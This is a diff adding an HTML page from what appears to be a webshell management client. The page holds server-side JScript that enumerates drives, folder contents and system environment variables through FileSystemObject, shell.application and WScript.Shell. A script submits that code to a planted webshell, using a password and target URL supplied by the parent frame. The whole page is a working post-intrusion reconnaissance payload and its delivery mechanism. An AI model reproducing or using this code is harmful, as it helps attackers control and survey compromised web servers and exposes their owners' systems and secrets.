@@ -1,0 +1,105 @@
+<HTML >
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
+<TITLE>磁盘信息</TITLE>
+<link rel="stylesheet" type="text/css" href="css.css">
+</HEAD>
+<BODY scroll="no" TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">
+
+<form name="codeform" method="post" action="" target=_blank>
+<textarea name="code">
+//使用的“ASP探针”中的代码
+var xie="";
+try{
+var oFso = Server.CreateObject("Scripting.FileSystemObject");
+
+function getStrType(s){
+	switch(s){
+	case 0: return "Unknown"
+	case 1: return "3.5 软盘"	//Removable
+	case 2: return "本地硬盘" 	//fixed
+	case 3: return "Network"
+	case 4: return "CD 驱动器"	//CD-ROM
+	case 5: return "RamDisk"
+		}
+	}
+	
+function getSize(iBytes){
+	if(iBytes<1024) return iBytes+' bytes';
+	else if(iBytes/1024<1024) return Math.round(iBytes/1024*100)/100 + ' KB'
+	else if(iBytes/1024/1024<1024) return Math.round(iBytes/1024/1024*100)/100 + ' MB'
+	else return Math.round(iBytes/1024/1024/1024*100)/100 + ' GB'
+}
+
+
+xie+='<table width="100%" border="0" cellpadding="3" cellspacing="1"><tr>'
++'<td width="30%">当前文件夹</td>'
++'<td width="70%"> 磁盘信息</td></tr>'
++'<tr><td align="left" valign="top" style="padding:7px;">'
+
+var sCurrPath = Server.MapPath(".");
+var oFolder = oFso.GetFolder(sCurrPath);
+xie+=sCurrPath
++ "<BR>子文件夹数："+oFolder.SubFolders.Count
++"<BR>文件数："+oFolder.Files.Count
++"<BR>大小："+getSize(oFolder.Size);
+
+xie+='</td><td valign="top" style="padding: 7px;">\
+<table width="100%" border="0" cellspacing="1" cellpadding="0">'
++"<tr align='right' bgColor='#dddddd'>"
++ "<td style='text-align:center'>磁盘</td>"
++ "<td style='width:100px'>类型</td>"
++ "<td style='width:100px'>文件系统</td>"
++ "<td style='width:100px;'>可用空间</td>"
++ "<td style='width:100px;'>总容量</td>"
++ "</tr>"
+
+//磁盘信息 fso
+var oDrivers = oFso.Drives;
+for(var x=new Enumerator(oDrivers);!x.atEnd();x.moveNext()) {
+var oDriver = x.item();
+
+xie+="<tr align='right'>"
++ "<td align='center'>"+oDriver.Path+"</td>"
++ "<td>"+getStrType(oDriver.DriveType)+"</td>"
++ "<td>"+(oDriver.isReady?oDriver.FileSystem:'N/A')+"</td>"
++ "<td>"+(oDriver.isReady?getSize(oDriver.AvailableSpace):'N/A')+"</td>"
++ "<td>"+(oDriver.isReady?getSize(oDriver.TotalSize):'N/A')+"</td>"
++ "</tr>";
+}
+
+xie+="</table></td></tr></table>";
+
+}catch(e){}
+
+//磁盘信息shell
+xie+="<HR/>磁盘信息<BR/>"
+try{var shell=new ActiveXObject("shell.application");}catch(e){}
+try{
+var c=new Enumerator(shell.namespace("c:\\").ParentFolder.Items());
+for (;!c.atEnd();c.moveNext())xie+=c.item().path+"<BR/>"
+}catch(e){}
+
+//环境变量列表
+try{
+var WshShell = Server.CreateObject("WScript.Shell");
+var WshSysEnv = new Enumerator(WshShell.Environment("SYSTEM"));
+xie+="<HR/>环境变量列表";
+for(;!WshSysEnv.atEnd();WshSysEnv.moveNext())
+xie+="<BR/>"+WshSysEnv.item().split("=")[0]+" > "+WshSysEnv.item().split("=")[1]
+}catch(e){}
+
+Response.write(xie);
+</textarea>
+</form>
+
+<script>
+function RUNonclick(){
+with(document.codeform){
+code.name=parent.PW.value;
+action=parent.url.value;
+submit();
+}
+}
+</script>
+</BODY></HTML>
